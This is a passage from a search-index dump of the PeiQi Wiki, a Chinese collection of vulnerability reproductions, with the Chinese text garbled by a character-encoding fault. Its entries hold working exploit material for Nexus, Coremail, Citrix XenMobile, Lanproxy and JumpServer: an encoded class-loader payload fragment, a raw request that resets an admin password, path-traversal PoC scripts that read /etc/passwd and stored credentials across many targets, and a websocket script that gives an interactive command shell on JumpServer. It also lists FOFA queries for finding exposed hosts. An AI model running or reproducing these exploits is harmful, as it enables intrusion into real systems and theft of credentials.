20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}\"] } } PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-29 10:08:59 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444.html","title":"Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444","keywords":"","body":"Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444 æ¼æ´æè¿° Nexus Repository Mangerå­˜åœ¨ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ï¼Œä½æƒé™ç”¨æˆ·å‘é€ç‰¹å®šçš„è¯·æ±‚åŒ…å¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç  æ¼æ´å½±å“ [!NOTE] Nexus 3.x OSS / Pro ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204 æ¼æ´å¤ç° æ¼æ´è§¦å‘éœ€è¦ä»»æ„è´¦æˆ·æƒé™ ç™»å½•ä»»æ„ç”¨æˆ·åä¿®æ”¹ NXSESSIONIDï¼Œå‘é€è¯·æ±‚åŒ…ä¿®æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç  PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.6080434247960143 Content-Type: text/plain Origin: http://139.198.174.173:8081 Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff Content-Length: 11 data=123456 è¿”å›204åˆ™ä¿®æ”¹æˆåŠŸ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-28 21:19:00 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Hue/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Hue/","title":"Hue","keywords":"","body":"Hue Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-22 15:17:14 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Hue/Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Hue/Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Hue åå°ç¼–è¾‘å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Hue åå°ç¼–è¾‘å™¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ç¼–è¾‘ä¸Šä¼  xxx.sh æ–‡ä»¶å³å¯è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ æ¼æ´å½±å“ [!NOTE] Hue åå°ç¼–è¾‘å™¨ FOFA [!NOTE] title=\"Hue - æ¬¢è¿ä½¿ç”¨ Hue\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ä¸Šä¼ å¹¶ç¼–è¾‘æ–‡ä»¶ä¸ºæ‰§è¡Œçš„å‘½ä»¤ æŒ‰å¦‚ä¸‹æ­¥éª¤ç‚¹å‡»å³å¯æ‰§è¡Œæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Coremail/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Coremail/","title":"Coremail","keywords":"","body":"Coremail Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-14 20:57:45 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Coremail/Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Coremail/Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° Coremail æŸä¸ªæ¥å£å­˜åœ¨é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œå…¶ä¸­å­˜åœ¨ç«¯å£ï¼Œé…ç½®ä¿¡æ¯ç­‰ æ¼æ´å½±å“ [!NOTE] Coremail é…ç½®ä¿¡æ¯æ³„éœ²æ¼æ´ FOFA [!NOTE] app=\"Coremailé‚®ä»¶ç³»ç»Ÿ\" æ¼æ´å¤ç° POCä¸º http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/ Goby & POC [!NOTE] Coremail configuration information disclosure PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/","title":"Citrix XenMobile","keywords":"","body":"Citrix XenMobileä¼ä¸šç§»åŠ¨æ€§ç®¡ç†ç³»ç»Ÿ Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-18 10:14:00 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Citrix XenMobile/Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209.html","title":"Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209","keywords":"","body":"Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 æ¼æ´æè¿° XenMobileæ˜¯Citrixå¼€å‘çš„ä¼ä¸šç§»åŠ¨æ€§ç®¡ç†è½¯ä»¶ã€‚è¯¥äº§å“å…è®¸ä¼ä¸šç®¡ç†å‘˜å·¥çš„ç§»åŠ¨è®¾å¤‡å’Œç§»åŠ¨åº”ç”¨ç¨‹åºã€‚è¯¥è½¯ä»¶çš„ç›®çš„æ˜¯é€šè¿‡å…è®¸å‘˜å·¥å®‰å…¨åœ°åœ¨ä¼ä¸šæ‹¥æœ‰çš„å’Œä¸ªäººç§»åŠ¨è®¾å¤‡åŠåº”ç”¨ç¨‹åºä¸Šå·¥ä½œæ¥æé«˜ç”Ÿäº§ç‡ã€‚ CVE-2020-8209ï¼Œè·¯å¾„éå†æ¼æ´ã€‚æ­¤æ¼æ´å…è®¸æœªç»æˆæƒçš„ç”¨æˆ·è¯»å–ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬åŒ…å«å¯†ç çš„é…ç½®æ–‡ä»¶ å½±å“ç‰ˆæœ¬ [!NOTE] RP2ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.12 RP4ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.11 RP6ä¹‹å‰çš„XenMobileæœåŠ¡å™¨10.1010.9 RP5ä¹‹å‰çš„XenMobileæœåŠ¡å™¨ FOFA [!NOTE] title=\"XenMobile\" æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd å¯ä»¥æˆåŠŸä¸‹è½½/etc/passwdæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] å«æœ‰CVE-2020-8209æ¼æ´ï¼ŒæˆåŠŸè¯»å–/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl > >> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/","title":"Lanproxy","keywords":"","body":"Lanproxy Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-12 13:59:44 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Lanproxy/Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019.html","title":"Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019","keywords":"","body":"Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 æ¼æ´æè¿° Lanproxyæ˜¯ä¸€ä¸ªå°†å±€åŸŸç½‘ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ä»£ç†åˆ°å…¬ç½‘çš„å†…ç½‘ç©¿é€å·¥å…·ï¼Œæ”¯æŒtcpæµé‡è½¬å‘ï¼Œå¯æ”¯æŒä»»ä½•tcpä¸Šå±‚åè®®ï¼ˆè®¿é—®å†…ç½‘ç½‘ç«™ã€æœ¬åœ°æ”¯ä»˜æ¥å£è°ƒè¯•ã€sshè®¿é—®ã€è¿œç¨‹æ¡Œé¢ç­‰ç­‰ï¼‰æœ¬æ¬¡Lanproxy è·¯å¾„éå†æ¼æ´ (CVE-2021-3019)é€šè¿‡../ç»•è¿‡è¯»å–ä»»æ„æ–‡ä»¶ã€‚è¯¥æ¼æ´å…è®¸ç›®å½•éå†è¯»å–/../conf/config.propertiesæ¥è·å–åˆ°å†…éƒ¨ç½‘è¿æ¥çš„å‡­æ®ã€‚ æ¼æ´å½±å“ [!NOTE] Lanproxy 0.1 FOFA [!NOTE] header= \"Server: LPS-0.1\" ç¯å¢ƒæ­å»º https://github.com/ffay/lanproxy/ æ¼æ´å¤ç° æ‰“å¼€ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨BurpæŠ“åŒ…å‘é€å¦‚ä¸‹è¯·æ±‚ GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close æˆåŠŸåœ¨é…ç½®æ–‡ä»¶ä¸­è¯»å– è´¦å·å¯†ç  è¯•ç€è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\"} def readConf(url): \"\"\" é»˜è®¤è¯»å–é…ç½®æ–‡ä»¶ï¼Œå¹¶é€šè¿‡èƒ½å¦è¯»å–é…ç½®æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ \"\"\" config = [ 'config.server.bind', 'config.server.port', 'config.admin.username', 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request.Request(confUrl, headers=headers) try: with request.urlopen(r, timeout=10) as resp: confContent = resp.read().decode('utf-8') for i in config: if i not in confContent: print(\"[-] \" + url + \" is not vulnerable\") return 'Bye :(' print(\"[+] \" + url + \" is vulnerable! :)\") return confContent except ConnectionResetError: print(\"[-] \" + url + \" Connection reset by peer\") except error.HTTPError as e: print(\"[-] \" + url + e.code + e.reason) except error.URLError as e: print(\"[-] \" + url + e.code + e.reason) except: print(\"[-] \" + url + \" is not vulnerable\") return 0 def readOtherFile(url, path): \"\"\" è¯»å–ä»»æ„å…¶ä»–æ–‡ä»¶ \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request.Request(fullUrl, headers=headers) with request.urlopen(r, timeout=10) as resp: fileContent = resp.read().decode('utf-8') print(fileContent) def run(url, path=\"/../conf/config.properties\"): if os.path.isfile(url) == False: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if path == \"/../conf/config.properties\": print(readConf(url)) else: if readConf(url) not in [0, 'Bye :(']: readOtherFile(url, path) else: urls = [] with open(url) as target: urls = target.read().splitlines() for url in urls: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if readConf(url) not in [0, 'Bye :(']: with open(\"success.txt\", \"a+\") as f: f.write(url + \"\\n\") f.close() def main(): parser = argparse.ArgumentParser( description=\"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\") parser.add_argument('-u', '--url', type=str, help=\"test a single website\") parser.add_argument('-r', '--read', type=str, help=\"this parameter is followed by the file name to be read, the configuration file is read by default\") parser.add_argument('-f', '--file', type=str, help=\"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\") args = parser.parse_args() if len(sys.argv) Goby & POC [!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/","title":"JumpServerå ¡å’æœº","keywords":"","body":"JumpServer å ¡å’æœº JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-18 15:44:07 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JumpServerå ¡å’æœº/JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° JumpServer æ˜¯å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœº, ä½¿ç”¨GNU GPL v2.0 å¼€æºåè®®, æ˜¯ç¬¦åˆ4A çš„ä¸“ä¸šè¿ç»´å®¡è®¡ç³»ç»Ÿã€‚ JumpServer ä½¿ç”¨Python / Django è¿›è¡Œå¼€å‘ã€‚2021å¹´1æœˆ15æ—¥ï¼Œé˜¿é‡Œäº‘åº”æ€¥å“åº”ä¸­å¿ƒç›‘æ§åˆ°å¼€æºå ¡å’æœºJumpServerå‘å¸ƒæ›´æ–°ï¼Œä¿®å¤äº†ä¸€å¤„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ç”±äº JumpServer æŸäº›æ¥å£æœªåšæˆæƒé™åˆ¶ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚è·å–åˆ°æ—¥å¿—æ–‡ä»¶è·å–æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…æ‰§è¡Œç›¸å…³APIæ“ä½œæ§åˆ¶å…¶ä¸­æ‰€æœ‰æœºå™¨ã€‚ æ¼æ´å½±å“ [!NOTE] JumpServer JumpServer JumpServer JumpServer = v1.5.9 FOFA [!NOTE] app=\"FIT2CLOUD-JumpServer-å ¡å’æœº\" ç¯å¢ƒæ­å»º å®‰è£… JumpServer v2.6.1 ç‰ˆæœ¬ ä¸‹è½½é“¾æ¥ [!NOTE] å®‰è£…æ³¨æ„ é…ç½®ç½‘ç»œï¼Œé…ç½®Mysqlï¼Œé…ç½®Redis é€‰æ‹© n ç­‰å¾…å®Œæˆå®‰è£…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start ç­‰å¾…å®‰è£…å®Œæ¯•è®¿é—® http://xxx.xxx.xxx.xxxx:8080 é»˜è®¤è´¦å·å¯†ç  amdin:admin æ¼æ´å¤ç° è¿›å…¥åå°æ·»åŠ é…ç½® èµ„äº§ç®¡ç† --> ç³»ç»Ÿç”¨æˆ· èµ„äº§ç®¡ç† --> ç®¡ç†ç”¨æˆ· ç”¨æˆ·ç®¡ç† --> ç”¨æˆ·åˆ—è¡¨ èµ„äº§ç®¡ç† --> èµ„äº§åˆ—è¡¨ æŸ¥çœ‹ä¸€ä¸‹é¡¹ç›®ä»£ç æäº¤å˜åŠ¨ import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger(__name__) class CeleryLogWebsocket(JsonWebsocketConsumer): disconnected = False def connect(self): user = self.scope[\"user\"] if user.is_authenticated and user.is_org_admin: self.accept() else: self.close() def receive(self, text_data=None, bytes_data=None, **kwargs): data = json.loads(text_data) task_id = data.get(\"task\") if task_id: self.handle_task(task_id) def wait_util_log_path_exist(self, task_id): log_path = get_celery_task_log_path(task_id) while not self.disconnected: if not os.path.exists(log_path): self.send_json({'message': '.', 'task': task_id}) time.sleep(0.5) continue self.send_json({'message': '\\r\\n'}) try: logger.debug('Task log path: {}'.format(log_path)) task_log_f = open(log_path, 'rb') return task_log_f except OSError: return None def read_log_file(self, task_id): task_log_f = self.wait_util_log_path_exist(task_id) if not task_log_f: logger.debug('Task log file is None: {}'.format(task_id)) return task_end_mark = [] while not self.disconnected: data = task_log_f.read(4096) if data: data = data.replace(b'\\n', b'\\r\\n') self.send_json( {'message': data.decode(errors='ignore'), 'task': task_id} ) if data.find(b'succeeded in') != -1: task_end_mark.append(1) if data.find(bytes(task_id, 'utf8')) != -1: task_end_mark.append(1) elif len(task_end_mark) == 2: logger.debug('Task log end: {}'.format(task_id)) break time.sleep(0.2) task_log_f.close() def handle_task(self, task_id): logger.info(\"Task id: {}\".format(task_id)) thread = threading.Thread(target=self.read_log_file, args=(task_id,)) thread.start() def disconnect(self, close_code): self.disconnected = True self.close() æ–°ç‰ˆå¯¹ç”¨æˆ·è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¯ä»¥ä½¿ç”¨ è°·æ­Œæ’ä»¶ WebSocket King è¿æ¥ä¸Šè¿™ä¸ªwebsocket è¿›è¡Œæ—¥å¿—è¯»å– æ¯”å¦‚sendè¿™é‡Œè·å–çš„ Task id ,è¿™é‡Œæ˜¯å¯ä»¥è·å¾—ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯çš„ æŸ¥çœ‹ä¸€ä¸‹è¿æ¥Webç»ˆç«¯çš„åç«¯apiä»£ç  å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨æ—¶å¿…é¡»éœ€è¦ user asset system_user è¿™ä¸‰ä¸ªå€¼ï¼Œå†è·å–ä¸€ä¸ª20ç§’çš„ token è®¿é—®webç»ˆç«¯åæŸ¥çœ‹æ—¥å¿—çš„è°ƒç”¨ docker exec -it (jumpserve/coreçš„docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 å¯ä»¥çœ‹åˆ°åœ¨ä¸åŒçš„æ—¶é—´è®¿é—®è¿™ä¸ªæ¥å£çš„asset_idç­‰éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªç”¨åœ¨ åˆšåˆšçš„æœªæˆæƒæ—¥å¿—è¯»å–é‡Œæ‰¾åˆ°æƒ³è¦çš„è¿™å‡ ä¸ªå€¼å°±å¯ä»¥è·å¾— token å‘é€è¯·æ±‚è·å–20sçš„token çœ‹ä¸€ä¸‹ koko.js è¿™ä¸ªå‰ç«¯æ–‡ä»¶ åç«¯ä»£ç  https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ è·å¾—çš„tokenæ¥æ¨¡æ‹Ÿè¯·æ±‚ æˆåŠŸè¿æ¥æ¨¡æ‹Ÿäº†è¿™ä¸ª token çš„è¯·æ±‚,å¯ä»¥åœ¨Networkçœ‹ä¸€ä¸‹æµé‡æ˜¯æ€ä¹ˆå‘é€çš„ æ¨¡æ‹Ÿè¿æ¥å‘é€å’Œæ¥å‘æ•°æ® è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªè¦æ¨¡æ‹Ÿäº†è¿™ä¸ªå‘é€ï¼Œè¿”å›çš„æ•°æ®å’Œwebç»ˆç«¯æ˜¯ä¸€æ ·çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™æ ·çš„æ–¹æ³•æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº† æ¼æ´åˆ©ç”¨POC [!NOTE] POC é‡ŒåŒ…å«ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è·å–æ—¥å¿—æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œ æ—¥å¿—æå–å·²ç»è¿‡æ»¤äº†éƒ¨åˆ†APIè°ƒç”¨çš„æ•°æ®ï¼Œåªéœ€è¦æ‰¾åˆ°é‚£å‡ ä¸ªå€¼å°±å¥½äº† å‘½ä»¤æ‰§è¡Œéœ€è¦ä»æ—¥å¿—ä¸­è·å–æ•æ„Ÿæ•°æ®å¹¶å†™å…¥è„šæœ¬å¯¹åº”çš„å˜é‡ä¸­ æ¥æ”¶æ•°æ®å¦‚æœå¡ä½è¯·è°ƒæ•´ for i in range(7) è¿™ä¸ªä½ç½®çš„ 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mPOC_Des: https://www.o2oxy.cn/ \\033[0m') print('+ \\033[34mVersion: JumpServer >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') class ws_long(WebSocketClient): def opened(self): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) # print(resp) data = resp['message'] print(data) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data: print(data) async def send_msg(websocket, _text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) async def main_logic(target_url): print(\"\\033[32m[o] æ­£åœ¨è¿æ¥ç›®æ ‡: {}\\033[0m\".format(target_url)) async with websockets.connect(target_url) as websocket: recv_text = await websocket.recv() resws = json.loads(recv_text) id = resws['id'] print(\"\\033[36m[o] æˆåŠŸè·å– ID: {}\\033[0m\".format(id)) inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket, inittext) for i in range(7): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) while True: cmd = str(input(\"\\033[35mcmd >>> \\033[0m\")) cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd + \"\\r\\n\"}) await send_msg(websocket, cmdtext) for i in range(1): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) def POC_1(target_url): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests.get(url=vuln_url, timeout=5) print(response.status_code) ws_open = str(input(\"\\033[32m[o] æ˜¯å¦æƒ³è¦æå–æ—¥å¿—ï¼ˆY/Nï¼‰ >>> \\033[0m\")) try: if ws_open == \"Y\" or ws_open == \"y\": ws = target_url.strip(\"http://\") try: ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws)) ws.connect() ws.run_forever() ws.close() except KeyboardInterrupt: ws.close() else: print(\"\\033[31m[x] ç›®æ ‡æ¼æ´å·²ä¿®å¤ï¼Œæ— æ³•è·å–æ•æ„Ÿæ—¥å¿—ä¿¡æ¯\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ç›®æ 